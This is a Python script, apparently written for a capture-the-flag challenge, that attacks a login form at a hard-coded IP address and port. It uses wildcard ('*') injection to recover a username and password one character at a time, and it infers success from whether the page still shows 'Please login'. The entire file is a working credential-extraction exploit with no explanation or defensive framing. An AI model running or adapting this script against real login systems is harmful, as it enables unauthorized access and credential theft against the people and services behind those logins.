import requests

url = "http://206.189.125.207:30394/login"
carectors = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890{[}]_:/"
cred = {"username": "", "password": ""}
temp = {"username": "", "password": ""}

flag = 1
temp['password'] = "*"


while flag == 1:
    flag = 0
    for i in carectors:
        temp['username'] = cred['username'] + i + '*'
        login = requests.post(url, data=temp)
        if ("Please login" in login.text):
            print(i)
        else:
            print("\n\n\n\n")
            flag = 1
            cred['username'] += i
            break
    print(cred['username'])

temp['username'] = cred['username']


print('username:', temp['username'])
temp['password'] = ""
flag = 1
while flag == 1:
    flag = 0
    for i in carectors:
        temp['password'] = cred['password'] + i + '*'
        login = requests.post(url, data=temp)
        if ("Please login" in login.text):
            print(i)
        else:
            print("\n\n\n\n")
            flag = 1
            cred['password'] += i
            break
    print(cred['password'])

print('username:', cred['username'])
print('password:', cred['password'])
